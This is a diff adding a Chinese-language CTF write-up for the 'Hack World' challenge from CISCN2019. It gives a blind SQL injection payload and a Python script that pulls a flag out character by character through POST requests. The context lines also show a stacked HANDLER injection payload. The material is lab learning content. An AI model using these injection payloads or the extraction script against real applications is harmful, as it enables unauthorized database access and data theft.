@@ -394,7 +394,35 @@ username数据表里面的3个字段分别是flag、name、password
 4. 1';handler `FlagHere` open as `kay`;handler `kay` read next;#
 5. Handler方法在上面的wp中有提及
 
+# [CISCN2019 华北赛区 Day2 Web1]Hack World 1
 
+1. fuzz一下，看到底哪些关键字被过滤掉了
+2. 测试注入点，发现是盲注，直接查flag表flag字段的内容
+3. id=(select(ascii(mid(flag,1,1))=102)from(flag))
+```python
+import requests
+import string
+
+def blind_injection(url):
+	flag = ''
+	strings = string.printable
+	for num in range(1,60):
+		for i in strings:
+			payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
+			post_data = {"id":payload}
+			res = requests.post(url=url,data=post_data)
+			if 'Hello' in res.text:
+				flag += i
+				print(flag)
+			else:
+				continue
+	print(flag)
+
+
+if __name__ == '__main__':
+	url = 'http://64368c9f-dd87-4c49-b9a1-d4b82e98c87a.node3.buuoj.cn/index.php'
+	blind_injection(url)
+```
 
 
 
